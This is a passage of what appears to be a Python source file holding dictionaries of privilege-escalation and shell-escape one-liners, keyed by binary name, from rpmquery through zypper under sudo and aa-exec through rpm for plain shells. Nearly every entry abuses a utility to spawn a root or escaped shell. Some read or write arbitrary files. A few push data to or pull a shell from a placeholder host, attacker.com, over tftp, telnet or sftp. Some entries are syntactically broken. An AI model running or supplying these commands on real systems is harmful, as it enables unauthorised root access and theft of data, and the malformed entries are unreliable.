        {
            "sudo rpmquery --eval '%{lua:posix.exec(\"/bin/sh\")}'"
        }
    ],
    "rpmverify": [
        {
            "sudo rpmverify --eval '%(/bin/sh 1>&2)'"
        }
    ],
    "rsync": [
        {
            "sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"
        }
    ],
    "ruby": [
        {
            "sudo ruby -e 'exec \"/bin/sh\"'"
        }
    ],
    "run-mailcap": [
        {
            "sudo run-mailcap --action=view /etc/hosts && /bin/sh",
        }
    ],
    "run-parts": [
        {
            "sudo run-parts --new-session --regex '^sh$' /bin"
        }
    ],
    "runscript": [
        {
            "TF=$(mktemp) && echo '! exec /bin/sh' >$TF && sudo runscript $TF"
        }
    ],
    "rview": [
        {
            "sudo rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
        },
        {
            "sudo rview -c ':lua os.execute(\"reset; exec sh\")'",
        }
    ],
    "rvim": [
        {
            "sudo rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
        },
        {
            "sudo rvim -c ':lua os.execute(\"reset; exec sh\")'",
        }
    ],
    "sash": [
        {
            "sudo sash"
        }
    ],
    "scanmem": [
        {
            "sudo scanmem && shell /bin/sh"
        }
    ],
    "scp": [
        {
            "TF=$(mktemp) && echo 'sh 0<&2 1>&2' > $TF && chmod +x \"$TF\" && sudo scp -S $TF x y:"
        }
    ],
    "screen": [
        {
            "sudo screen"
        }
    ],
    "script": [
        {
            "sudo script -q /dev/null"
        }
    ],
    "scrot": [
        {
            "sudo scrot -e /bin/sh"
        }
    ],
    "sed": [
        {
            "sudo sed e",
        },
        {
            "sudo sed -n '1e exec sh 1>&0' /etc/hosts",
        }
    ],
    "service": [
        {
            "sudo service ../../bin/sh"
        }
    ],
    "setarch": [
        {
            "sudo setarch $(arch) /bin/sh"
        }
    ],
    "setfacl": [
        {
            "LFILE=file_to_change && USER=somebody && sudo setfacl -m -u:$USER:rwx $LFILE"
        }
    ],
    "setlock": [
        {
            "sudo setlock - /bin/sh"
        }
    ],
    "sftp": [
        {
            "RHOST=user@attacker.com && sudo sftp $RHOST && /bin/sh"
        }
    ],
    "sg": [
        {
            "sudo sg root"
        }
    ],
    "shuf": [
        {
            "LFILE=file_to_write && sudo shuf -e DATA -o \"$LFILE\"",
        }
    ],
    "slsh": [
        {
            "sudo slsh -e 'system(\"/bin/sh\")'"
        }
    ],
    "smbclient": [
        {
            "sudo smbclient '\\\\attacker\\share' && /bin/sh"
        }
    ],
    "snap": [
        {
            "sudo snap install xxxx_1.0_all.snap --dangerous --devmode",
        }
    ],
    "socat": [
        {
            "sudo socat stdin exec:/bin/sh",
        }
    ],
    "soelim": [
        {
            "LFILE=file_to_read && sudo soelim \"$LFILE\""
        }
    ],
    "softlimit": [
        {
            "sudo softlimit /bin/sh"
        }
    ],
    "sort": [
        {
            "LFILE=file_to_read && sudo sort -m \"$LFILE\""
        }
    ],
    "split": [
        {
            "sudo split --filter=/bin/sh /dev/stdin",
        }
    ],
    "sqlite3": [
        {
            "sudo sqlite3 /dev/null '.shell /bin/sh'"
        }
    ],
    "sqlmap": [
        {
            "sudo sqlmap -u 127.0.0.1 --eval=\"import os; os.system('/bin/sh')\""
        }
    ],
    "ss": [
        {
            "LFILE=file_to_read && sudo ss -a -F $LFILE"
        }
    ],
    "ssh": [
        {
            "sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x",
        }
    ],
    "ssh-agent": [
        {
            "sudo ssh-agent /bin/"
        }
    ],
    "ssh-keygen": [
        {
            "sudo ssh-keygen -D ./lib.so",
        }
    ],
    "ssh-keyscan": [
        {
            "LFILE=file_to_read && sudo ssh-keyscan -f $LFILE"
        }
    ],
    "sshpass": [
        {
            "sudo sshpass /bin/sh"
        }
    ],
    "start-stop-daemon": [
        {
            "sudo start-stop-daemon -n $RANDOM -S -x /bin/sh"
        }
    ],
    "stdbuf": [
        {
            "sudo stdbuf -i0 /bin/sh"
        }
    ],
    "strace": [
        {
            "sudo strace -o /dev/null /bin/sh"
        }
    ],
    "strings": [
        {
            "LFILE=file_to_read && sudo strings \"$LFILE\""
        }
    ],
    "su": [
        {
            "sudo su"
        }
    ],
    "sudo": [
        {
            "sudo sudo /bin/sh"
        }
    ],
    "sysctl": [
        {
            "COMMAND='/bin/sh -c id>/tmp/id' && sudo sysctl \"kernel.core_pattern=|$COMMAND\" && sleep 9999 & && kill -QUIT $! && cat /tmp/id"
        }
    ],
    "systemctl": [
        {
            "TF=$(mktemp) && echo /bin/sh >$TF && chmod +x $TF && sudo SYSTEMD_EDITOR=$TF systemctl edit system.slice"
        },
        {
            "TF=$(mktemp).service && echo '[Service] && Type=oneshot && ExecStart=/bin/sh -c \"id > /tmp/output\" && [Install] && WantedBy=multi-user.target' > $TF && sudo systemctl link $TF && sudo systemctl enable --now $TF"
        },
        {
            "sudo systemctl && !sh",
        }
    ],
    "systemd-resolve": [
        {
            "sudo systemd-resolve --status && !sh",
        }
    ],
    "tac": [
        {
            "LFILE=file_to_read && sudo tac -s 'RANDOM' \"$LFILE\""
        }
    ],
    "tail": [
        {
            "LFILE=file_to_read && sudo tail -c1G \"$LFILE\""
        }
    ],
    "tar": [
        {
            "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
        }
    ],
    "task": [
        {
            "sudo task execute /bin/sh"
        }
    ],
    "taskset": [
        {
            "sudo taskset 1 /bin/sh"
        }
    ],
    "tasksh": [
        {
            "sudo tasksh && /bin/sh"
        }
    ],
    "tbl": [
        {
            "LFILE=file_to_read && sudo tbl $LFILE"
        }
    ],
    "tclsh": [
        {
            "sudo tclsh && exec /bin/sh <@stdin >@stdout 2>@stderr"
        }
    ],
    "tcpdump": [
        {
            "COMMAND='id' && TF=$(mktemp) && echo \"$COMMAND\" > $TF && chmod +x $TF && sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root"
        }
    ],
    "tdbtool": [
        {
            "sudo tdbtool && ! /bin/sh"
        }
    ],
    "tee": [
        {
            "LFILE=file_to_write && echo DATA | sudo tee -a \"$LFILE\""
        }
    ],
    "telnet": [
        {
            "RHOST=attacker.com && RPORT=12345 && sudo telnet $RHOST $RPORT && ^] && /bin/sh",
        }
    ],
    "terraform": [
        {
            "sudo terraform console && file(\"file_to_read\")"
        }
    ],
    "tex": [
        {
            "sudo tex --shell-escape '\\write18{/bin/sh}\\end'"
        }
    ],
    "tftp": [
        {
            "RHOST=attacker.com && sudo tftp $RHOST && put file_to_send",
        }
    ],
    "tic": [
        {
            "LFILE=file_to_read && sudo tic -C \"$LFILE\""
        }
    ],
    "time": [
        {
            "sudo /usr/bin/time /bin/sh"
        }
    ],
    "timedatectl": [

        {
            "sudo timedatectl list-timezones && /bin/sh"
        }
    ],
    "timeout": [
        {
            "sudo timeout --foreground 7d /bin/sh"
        }
    ],
    "tmate": [
        {
            "sudo tmate -c /bin/sh"
        }
    ],
    "tmux": [
        {
            "sudo tmux"
        }
    ],
    "top": [
        {
            "echo -e 'pipe\\tx\\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc && sudo top && # press return twice && reset",
        }
    ],
    "torify": [
        {
            "sudo torify /bin/sh"
        }
    ],
    "torsocks": [
        {
            "sudo torsocks /bin/sh"
        }
    ],
    "troff": [
        {
            "LFILE=file_to_read && sudo troff $LFILE"
        }
    ],
    "ul": [
        {
            "LFILE=file_to_read && sudo ul \"$LFILE\""
        }
    ],
    "unexpand": [
        {
            "LFILE=file_to_read && sudo unexpand -t99999999 \"$LFILE\""
        }
    ],
    "uniq": [
        {
            "LFILE=file_to_read && sudo uniq \"$LFILE\""
        }
    ],
    "unshare": [
        {
            "sudo unshare /bin/sh"
        }
    ],
    "unsquashfs": [
        {
            "sudo unsquashfs shell && ./squashfs-root/sh -p"
        }
    ],
    "unzip": [
        {
            "sudo unzip -K shell.zip && ./sh -p"
        }
    ],
    "update-alternatives": [
        {
            "LFILE=/path/to/file_to_write && TF=$(mktemp) && echo DATA >$TF && sudo update-alternatives --force --install \"$LFILE\" x \"$TF\" 0",
        }
    ],
    "uudecode": [
        {
            "LFILE=file_to_read && sudo uuencode \"$LFILE\" /dev/stdout | uudecode"
        }
    ],
    "uuencode": [
        {
            "LFILE=file_to_read && sudo uuencode \"$LFILE\" /dev/stdout | uudecode"
        }
    ],
    "vagrant": [
        {
            "cd $(mktemp -d) && echo 'exec \"/bin/sh\"' > Vagrantfile && vagrant up"
        }
    ],
    "valgrind": [
        {
            "valgrind /bin/sh"
        },
        {
            "sudo valgrind /bin/sh"
        }
    ],
    "varnishncsa": [
        {
            "LFILE=file_to_write && sudo varnishncsa -g request -q 'ReqURL ~ \"/xxx\"' -F '%{yyy}i' -w \"$LFILE\""
        }
    ],
    "vi": [
        {
            "sudo vi -c ':!/bin/sh' /dev/null"
        }
    ],
    "view": [
        {
            "sudo view -c ':!/bin/sh'"
        },
        {
            "sudo view -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
        },
        {
            "sudo view -c ':lua os.execute(\"reset; exec sh\")'",
        }
    ],
    "vigr": [
        {
            "sudo vigr"
        }
    ],
    "vim": [
        {
            "sudo vim -c ':!/bin/sh'"
        },
        {
            "sudo vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
        },
        {
            "sudo vim -c ':lua os.execute(\"reset; exec sh\")'",
        }
    ],
    "vimdiff": [
        {
            "sudo vimdiff -c ':!/bin/sh'"
        },
        {
            "sudo vimdiff -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
        },
        {
            "sudo vimdiff -c ':lua os.execute(\"reset; exec sh\")'",
        }
    ],
    "vipw": [
        {
            "sudo vipw"
        }
    ],
    "w3m": [
        {
            "LFILE=file_to_read && sudo w3m \"$LFILE\" -dump"
        }
    ],
    "wall": [
        {
            "LFILE=file_to_read && sudo wall --nobanner \"$LFILE\""
        }
    ],
    "watch": [
        {
            "watch -x sh -c 'reset; exec sh 1>&0 2>&0'"
        },
        {
            "sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'"
        }
    ],
    "wc": [
        {
            "LFILE=file_to_read && sudo wc --files0-from \"$LFILE\""
        }
    ],
    "wget": [
        {
            "TF=$(mktemp) && chmod +x $TF && echo -e '#!/bin/sh\ && /bin/sh 1>&0' >$TF && sudo wget --use-askpass=$TF 0"
        }
    ],
    "whiptail": [
        {
            "LFILE=file_to_read && sudo whiptail --textbox --scrolltext \"$LFILE\" 0 0"
        }
    ],
    "wireshark": [
        {
            "PORT=4444 && sudo wireshark -c 1 -i lo -k -f \"udp port $PORT\" & && echo 'DATA' | nc -u 127.127.127.127 \"$PORT\"",
        }
    ],
    "wish": [
        {
            "sudo wish && exec /bin/sh <@stdin >@stdout 2>@stderr"
        }
    ],
    "xargs": [
        {
            "sudo xargs -a /dev/null sh",
        }
    ],
    "xdg-user-dir": [
        {
            "sudo xdg-user-dir '}; /bin/sh #'"
        }
    ],
    "xdotool": [
        {
            "sudo xdotool exec --sync /bin/sh"
        }
    ],
    "xelatex": [
        {
            "sudo xelatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}' && strings article.dvi",
        },
        {
            "sudo xelatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'"
        }
    ],
    "xetex": [
        {
            "sudo xetex --shell-escape '\\write18{/bin/sh}\\end'"
        }
    ],
    "xmodmap": [
        {
            "LFILE=file_to_read && sudo xmodmap -v $LFILE"
        }
    ],
    "xmore": [
        {
            "LFILE=file_to_read && sudo xmore $LFILE"
        }
    ],
    "xpad": [
        {
            "LFILE=file_to_read && sudo xpad -f \"$LFILE\""
        }
    ],
    "xxd": [
        {
            "LFILE=file_to_read && sudo xxd \"$LFILE\" | xxd -r"
        }
    ],
    "xz": [
        {
            "LFILE=file_to_read && sudo xz -c \"$LFILE\" | xz -d"
        }
    ],
    "yarn": [
        {
            "sudo yarn exec /bin/sh"
        }
    ],
    "yash": [
        {
            "sudo yash"
        }
    ],
    "yum": [
        {
            "sudo yum localinstall -y x-1.0-1.noarch.rpm",
        }
    ],
    "zathura": [
        {
            "sudo zathura && :! /bin/sh -c 'exec /bin/sh 0<&1'"
        }
    ],
    "zip": [
        {
            "TF=$(mktemp -u) && sudo zip $TF /etc/hosts -T -TT 'sh #' && sudo rm $TF"
        }
    ],
    "zsh": [
        {
            "sudo zsh"
        }
    ],
    "zsoelim": [
        {
            "LFILE=file_to_read && sudo zsoelim \"$LFILE\""
        }
    ],
    "zypper": [
        {
            "sudo zypper x",
        },
        {
            "TF=$(mktemp -d) && cp /bin/sh $TF/zypper-x && sudo PATH=$TF:$PATH zypper x"
        }
    ]
}
# SUDO_BINS_END

shell_bins = {
    "aa-exec": [
        {
            "aa-exec /bin/sh"
        }
    ],
    "ansible-playbook": [
        {
            "TF=$(mktemp) && echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF && ansible-playbook $TF"
        }
    ],
    "ansible-test": [
        {
            "ansible-test shell"
        }
    ],
    "aoss": [
        {
            "aoss /bin/sh"
        }
    ],
    "apt": [
        {
            "apt changelog apt && /bin/sh",
        }
    ],
    "apt-get": [
        {
            "apt-get changelog apt && /bin/sh",
        }
    ],
    "ash": [
        {
            "ash"
        }
    ],
    "at": [
        {
            "echo \"/bin/sh <$(tty) >$(tty) 2>$(tty)\" | at now; tail -f /dev/null"
        }
    ],
    "awk": [
        {
            "awk 'BEGIN {system(\"/bin/sh\")}'"
        }
    ],
    "aws": [
        {
            "aws help && /bin/sh",
        }
    ],
    "bash": [
        {
            "bash"
        }
    ],
    "batcat": [
        {
            "batcat --paging always /etc/profile && /bin/sh"
        }
    ],
    "bconsole": [
        {
            "bconsole && @exec /bin/sh"
        }
    ],
    "bundle": [
        {
            "bundle help && /bin/sh",
        },
        {
            "export BUNDLE_GEMFILE=x && bundle exec /bin/sh",
        },
        {
            "TF=$(mktemp -d) && touch $TF/Gemfile && cd $TF && bundle exec /bin/sh",
        },
        {
            "TF=$(mktemp -d) && touch $TF/Gemfile && cd $TF && bundle console && system('/bin/sh -c /bin/sh')",
        },
        {
            "TF=$(mktemp -d) && echo 'system('/bin/sh')' > $TF/Gemfile && cd $TF && bundle install",
        }
    ],
    "bundler": [
        {
            "bundler help && /bin/sh",
        },
        {
            "export BUNDLE_GEMFILE=x && bundler exec /bin/sh",
        },
        {
            "TF=$(mktemp -d) && touch $TF/Gemfile && cd $TF && bundler exec /bin/sh",
        },
        {
            "TF=$(mktemp -d) && touch $TF/Gemfile && cd $TF && bundler console && system('/bin/sh -c /bin/sh')",
        },
        {
            "TF=$(mktemp -d) && echo 'system('/bin/sh')' > $TF/Gemfile && cd $TF && bundler install",
        }
    ],
    "busctl": [
        {
            "busctl --show-machine && /bin/sh"
        },
        {
            "busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'"
        }
    ],
    "busybox": [
        {
            "busybox sh"
        }
    ],
    "byebug": [
        {
            "TF=$(mktemp) && echo 'system('/bin/sh')' > $TF && byebug $TF && continue"
        }
    ],
    "c89": [
        {
            "c89 -wrapper /bin/sh,-s ."
        }
    ],
    "c99": [
        {
            "c99 -wrapper /bin/sh,-s ."
        }
    ],
    "cabal": [
        {
            "cabal exec -- /bin/sh"
        }
    ],
    "capsh": [
        {
            "capsh --"
        }
    ],
    "cat": [
        {
            "LFILE=file_to_read && cat \"$LFILE\""
        }
    ],
    "cdist": [
        {
            "cdist shell -s /bin/sh"
        }
    ],
    "certbot": [
        {
            "TF=$(mktemp -d) && certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'"
        }
    ],
    "check_by_ssh": [
        {
            "check_by_ssh -o \"ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)\" -H localhost -C xx",
        }
    ],
    "choom": [
        {
            "choom -n 0 /bin/sh"
        },
        {
            "sudo choom -n 0 /bin/sh"
        }
    ],
    "cobc": [
        {
            "TF=$(mktemp -d) && echo 'CALL \"SYSTEM\" USING \"/bin/sh\".' > $TF/x && cobc -xFj --frelax-syntax-checks $TF/x"
        }
    ],
    "composer": [
        {
            "TF=$(mktemp -d) && echo '{\"scripts\":{\"x\":\"/bin/sh -i 0<&3 1>&3 2>&3\"}}' >$TF/composer.json && composer --working-dir=$TF run-script x"
        }
    ],
    "cowsay": [
        {
            "TF=$(mktemp) && echo 'exec \"/bin/sh\";' >$TF && cowsay -f $TF x"
        }
    ],
    "cowthink": [
        {
            "TF=$(mktemp) && echo 'exec \"/bin/sh\";' >$TF && cowthink -f $TF x"
        }
    ],
    "cpan": [
        {
            "cpan && ! exec '/bin/bash'"
        }
    ],
    "cpio": [
        {
            "echo '/bin/sh </dev/tty >/dev/tty' >localhost && cpio -o --rsh-command /bin/sh -F localhost:"
        }
    ],
    "cpulimit": [
        {
            "cpulimit -l 100 -f /bin/sh"
        }
    ],
    "crash": [
        {
            "crash -h && !sh",
        }
    ],
    "crontab": [
        {
            "crontab -e",
        }
    ],
    "csh": [
        {
            "csh"
        }
    ],
    "csvtool": [
        {
            "csvtool call '/bin/sh;false' /etc/passwd"
        }
    ],
    "dash": [
        {
            "dash"
        }
    ],
    "dc": [
        {
            "dc -e '!/bin/sh'"
        }
    ],
    "debugfs": [
        {
            "debugfs && /bin/sh"
        }
    ],
    "distcc": [
        {
            "distcc /bin/sh"
        }
    ],
    "dmesg": [
        {
            "dmesg -H && /bin/sh",
        }
    ],
    "docker": [
        {
            "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
        }
    ],
    "dotnet": [
        {
            "dotnet fsi && System.Diagnostics.Process.Start(\"/bin/sh\").WaitForExit();;"
        }
    ],
    "dpkg": [
        {
            "dpkg -l && /bin/sh",
        }
    ],
    "dstat": [
        {
            "mkdir -p ~/.dstat && echo 'import os; os.execv('/bin/sh', ['sh'])' >~/.dstat/dstat_xxx.py && dstat --xxx"
        }
    ],
    "dvips": [
        {
            "tex '\\special{psfile=\"`/bin/sh 1>&0\"}\\end' && dvips -R0 texput.dvi"
        }
    ],
    "easy_install": [
        {
            "TF=$(mktemp -d) && echo \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py && easy_install $TF"
        }
    ],
    "eb": [
        {
            "eb logs && /bin/sh"
        }
    ],
    "ed": [
        {
            "ed && /bin/sh"
        }
    ],
    "elvish": [
        {
            "elvish"
        }
    ],
    "emacs": [
        {
            "emacs -Q -nw --eval '(term \"/bin/sh\")'"
        }
    ],
    "enscript": [
        {
            "enscript /dev/null -qo /dev/null -I '/bin/sh >&2'"
        }
    ],
    "env": [
        {
            "env /bin/sh"
        }
    ],
    "eqn": [
        {
            "LFILE=file_to_read && sudo eqn \"$LFILE\""
        }
    ],
    "ex": [
        {
            "ex && /bin/sh"
        }
    ],
    "expect": [
        {
            "expect -c 'spawn /bin/sh;interact'"
        }
    ],
    "facter": [
        {
            "TF=$(mktemp -d) && echo 'exec(\"/bin/sh\")' > $TF/x.rb && FACTERLIB=$TF facter"
        }
    ],
    "find": [
        {
            "find . -exec /bin/sh \\; -quit"
        }
    ],
    "fish": [
        {
            "fish"
        }
    ],
    "flock": [
        {
            "flock -u / /bin/sh"
        }
    ],
    "ftp": [
        {
            "ftp && /bin/sh"
        }
    ],
    "gawk": [
        {
            "gawk 'BEGIN {system(\"/bin/sh\")}'"
        }
    ],
    "gcc": [
        {
            "gcc -wrapper /bin/sh,-s ."
        }
    ],
    "gcloud": [
        {
            "gcloud help && /bin/sh",
        }
    ],
    "gdb": [
        {
            "gdb -nx -ex '!sh' -ex quit"
        }
    ],
    "gem": [
        {
            "gem open -e \"/bin/sh -c /bin/sh\" rdoc",
        },
        {
            "gem open rdoc && :!/bin/sh",
        },
        {
            "TF=$(mktemp -d) && echo 'system(\"/bin/sh\")' > $TF/x && gem build $TF/x",
        },
        {
            "TF=$(mktemp -d) && echo 'system(\"/bin/sh\")' > $TF/x && gem install --file $TF/x",
        }
    ],
    "genie": [
        {
            "genie -c '/bin/sh'"
        }
    ],
    "ghc": [
        {
            "ghc -e 'System.Process.callCommand \"/bin/sh\"'"
        }
    ],
    "ghci": [
        {
            "ghci && System.Process.callCommand \"/bin/sh\""
        }
    ],
    "gimp": [
        {
            "gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(\"sh\")'"
        }
    ],
    "ginsh": [
        {
            "ginsh && /bin/sh"
        }
    ],
    "git": [
        {
            "PAGER='sh -c \"exec sh 0<&1\"' git -p help"
        },
        {
            "git help config && /bin/sh",
        },
        {
            "git branch --help config && /bin/sh",
        },
        {
            "TF=$(mktemp -d) && git init \"$TF\" && echo 'exec /bin/sh 0<&2 1>&2' >\"$TF/.git/hooks/pre-commit.sample\" && mv \"$TF/.git/hooks/pre-commit.sample\" \"$TF/.git/hooks/pre-commit\" && git -C \"$TF\" commit --allow-empty -m x",
        },
        {
            "TF=$(mktemp -d) && ln -s /bin/sh \"$TF/git-x\" && git \"--exec-path=$TF\" x"
        }
    ],
    "grc": [
        {
            "grc --pty /bin/sh"
        }
    ],
    "gtester": [
        {
            "TF=$(mktemp) && echo '#!/bin/sh' > $TF && echo 'exec /bin/sh 0<&1' >> $TF && chmod +x $TF && gtester -q $TF"
        }
    ],
    "hping3": [
        {
            "hping3 && /bin/sh"
        }
    ],
    "iftop": [
        {
            "iftop && /bin/sh"
        }
    ],
    "ionice": [
        {
            "ionice /bin/sh"
        }
    ],
    "irb": [
        {
            "irb && exec '/bin/bash'"
        }
    ],
    "ispell": [
        {
            "ispell /etc/passwd && /bin/sh"
        }
    ],
    "jjs": [
        {
            "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()\" | jjs"
        }
    ],
    "joe": [
        {
            "joe && ^K /bin/sh"
        }
    ],
    "journalctl": [
        {
            "journalctl && /bin/sh"
        }
    ],
    "jrunscript": [
        {
            "jrunscript -e \"exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')\""
        }
    ],
    "jtag": [
        {
            "jtag --interactive && shell /bin/sh"
        }
    ],
    "julia": [
        {
            "julia -e 'run(`/bin/sh`)'"
        }
    ],
    "knife": [
        {
            "knife exec -E 'exec \"/bin/sh\"'"
        }
    ],
    "ksh": [
        {
            "ksh"
        }
    ],
    "latex": [
        {
            "latex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'",
        }
    ],
    "latexmk": [
        {
            "latexmk -e 'exec \"/bin/sh\";'"
        },
        {
            "latexmk -latex='/bin/sh #' /dev/null"
        }
    ],
    "ld.so": [
        {
            "/lib/ld.so /bin/sh"
        }
    ],
    "less": [
        {
            "less /etc/profile && /bin/sh"
        },
        {
            "VISUAL=\"/bin/sh -c '/bin/sh'\" less /etc/profile && v"
        },
        {
            "less /etc/profile && v:shell"
        }
    ],
    "lftp": [
        {
            "lftp -c '!/bin/sh'"
        }
    ],
    "loginctl": [
        {
            "loginctl user-status && /bin/sh"
        }
    ],
    "logsave": [
        {
            "logsave /dev/null /bin/sh -i"
        }
    ],
    "ltrace": [
        {
            "ltrace -b -L /bin/sh"
        }
    ],
    "lua": [
        {
            "lua -e 'os.execute(\"/bin/sh\")'"
        }
    ],
    "lualatex": [
        {
            "lualatex -shell-escape '\\documentclass{article}\\begin{document}\\directlua{os.execute(\"/bin/sh\")}\\end{document}'"
        }
    ],
    "luatex": [
        {
            "luatex -shell-escape '\\directlua{os.execute(\"/bin/sh\")}\\end'"
        }
    ],
    "mail": [
        {
            "mail --exec='!/bin/sh'",
        },
        {
            "TF=$(mktemp) && echo \"From nobody@localhost $(date)\" > $TF && mail -f $TF && !/bin/sh'",
        }
    ],
    "make": [
        {
            "COMMAND='/bin/sh' && make -s --eval=$'x:\ && \\t-'\"$COMMAND\""
        }
    ],
    "man": [
        {
            "man man && /bin/sh"
        },
        {
            "man '-H/bin/sh #' man"
        }
    ],
    "mawk": [
        {
            "mawk 'BEGIN {system(\"/bin/sh\")}'"
        }
    ],
    "more": [
        {
            "TERM= more /etc/profile && /bin/sh"
        },
    ],
    "msfconsole": [
        {
            "msfconsole && msf6 > irb && >> system(\"/bin/sh\")"
        }
    ],
    "msgfilter": [
        {
            "echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'",
        }
    ],
    "multitime": [
        {
            "multitime /bin/sh"
        }
    ],
    "mysql": [
        {
            "mysql -e '\\! /bin/sh'"
        }
    ],
    "nano": [
        {
            "nano && ^R^X && reset; sh 1>&0 2>&0"
        },
        {
            "nano -s /bin/sh /bin/sh ^T"
        }
    ],
    "nawk": [
        {
            "nawk 'BEGIN {system(\"/bin/sh\")}'"
        }
    ],
    "ncdu": [
        {
            "ncdu && b"
        }
    ],
    "ncftp": [
        {
            "ncftp && /bin/sh"
        }
    ],
    "neofetch": [
        {
            "TF=$(mktemp) && echo 'exec /bin/sh' >$TF && neofetch --config $TF"
        }
    ],
    "nice": [
        {
            "nice /bin/sh"
        }
    ],
    "nmap": [
        {
            "TF=$(mktemp) && echo 'os.execute(\"/bin/sh\")' > $TF && nmap --script=$TF",
        },
        {
            "nmap --interactive && nmap> !sh",
        }
    ],
    "node": [
        {
            "node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'"
        }
    ],
    "nohup": [
        {
            "nohup /bin/sh -c \"sh <$(tty) >$(tty) 2>$(tty)\""
        }
    ],
    "npm": [
        {
            "npm exec /bin/sh",
        },
        {
            "TF=$(mktemp -d) && echo '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' > $TF/package.json && npm -C $TF i",
        }
    ],
    "nroff": [
        {
            "TF=$(mktemp -d) && echo '#!/bin/sh' > $TF/groff && echo '/bin/sh' >> $TF/groff && chmod +x $TF/groff && GROFF_BIN_PATH=$TF nroff"
        }
    ],
    "nsenter": [
        {
            "nsenter /bin/sh"
        }
    ],
    "octave": [
        {
            "octave-cli --eval 'system(\"/bin/sh\")'"
        }
    ],
    "openvpn": [
        {
            "openvpn --dev null --script-security 2 --up '/bin/sh -c sh'"
        }
    ],
    "pandoc": [
        {
            "TF=$(mktemp) && echo 'os.execute(\"/bin/sh\")' >$TF && pandoc -L $TF /dev/null",
        }
    ],
    "pdb": [
        {
            "TF=$(mktemp) && echo 'import os; os.system(\"/bin/sh\")' > $TF && pdb $TF && cont"
        }
    ],
    "pdflatex": [
        {
            "pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'",
        }
    ],
    "pdftex": [
        {
            "pdftex --shell-escape '\\write18{/bin/sh}\\end'"
        }
    ],
    "perf": [
        {
            "perf stat /bin/sh"
        }
    ],
    "perl": [
        {
            "perl -e 'exec \"/bin/sh\";'"
        }
    ],
    "perlbug": [
        {
            "perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;'"
        }
    ],
    "pexec": [
        {
            "pexec /bin/sh"
        }
    ],
    "pg": [
        {
            "pg /etc/profile && /bin/sh"
        }
    ],
    "php": [
        {
            "export CMD=\"/bin/sh\" && php -r 'system(getenv(\"CMD\"));'"
        },
        {
            "export CMD=\"/bin/sh\" && php -r 'passthru(getenv(\"CMD\"));'"
        },
        {
            "export CMD=\"/bin/sh\" && php -r \"print(shell_exec(('$CMD')));\""
        },
        {
            "export CMD=\"/bin/sh\" && php -r '\$r=array(); exec(getenv(\"CMD\"), \$r); print(join(\"\\n\",\$r));'"
        },
        {
            "export CMD=\"/bin/sh\" && php -r '\$h=@popen(getenv(\"CMD\"),\"r\"); if(\$h){ while(!feof(\$h)) echo(fread(\$h,4096)); pclose(\$h); }'"
        }
    ],
    "pic": [
        {
            "pic -U && .PS && sh X sh X"
        }
    ],
    "pico": [
        {
            "pico && ^R^X && reset; sh 1>&0 2>&0"
        },
        {
            "pico -s /bin/sh && /bin/sh && ^T"
        }
    ],
    "pip": [
        {
            "TF=$(mktemp -d) && echo \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py && pip install $TF"
        }
    ],
    "posh": [
        {
            "posh"
        }
    ],
    "pry": [
        {
            "pry && system(\"/bin/sh\")"
        }
    ],
    "psftp": [
        {
            "psftp && /bin/sh"
        }
    ],
    "psql": [
        {
            "psql && \\? && /bin/sh"
        }
    ],
    "puppet": [
        {
            "puppet apply -e \"exec { '/bin/sh -c \\\"exec sh -i <$(tty) >$(tty) 2>$(tty)\\\"': }\""
        }
    ],
    "pwsh": [
        {
            "pwsh"
        }
    ],
    "python": [
        {
            "python -c 'import os; os.system(\"/bin/sh\")'"
        }
    ],
    "rake": [
        {
            "rake -p '`/bin/sh 1>&0`'"
        }
    ],
    "rc": [
        {
            "rc -c '/bin/sh'"
        }
    ],
    "rlwrap": [
        {
            "rlwrap /bin/sh"
        }
    ],
    "rpm": [
        {
            "rpm --eval '%{lua:os.execute(\"/bin/sh\")}'"
        },
        {
            "rpm --pipe '/bin/sh 0<&1'",
        }
    ],
    "rpmdb": [
        {
            "rpmdb --eval '%(/bin/sh 1>&2)'"
        }
    ],
    "rpmquery": [
        {
